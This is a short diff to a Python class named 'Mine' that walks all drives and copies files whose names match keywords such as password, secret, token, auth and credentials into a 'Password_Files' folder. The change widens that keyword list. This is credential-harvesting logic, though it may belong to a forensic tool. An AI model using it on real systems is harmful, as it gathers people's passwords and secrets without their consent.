@@ -120,7 +120,7 @@ class Mine:
             destination.mkdir()
 
         with ThreadPoolExecutor() as executor:
-            for root, dirs, files in os.walk(drives_root):
+            for root, dirs, _ in os.walk(drives_root):
                 future_to_file = {
                     executor.submit(cls.__search_files_by_keyword, Path(root) / sub_dir, keyword): sub_dir
                     for sub_dir in dirs
@@ -159,7 +159,8 @@ class Mine:
         Logging:
             - Logs an informational message upon completion of the search and copy process
         """
-        keywords = ["password", "secret", "code", "login", "api", "key"]
+        keywords = ["password", "secret", "code", "login", "api", "key",
+                    "token", "auth", "credentials", "private", ]
 
         # Ensure the destination directory is clean
         destination = Path("Password_Files")
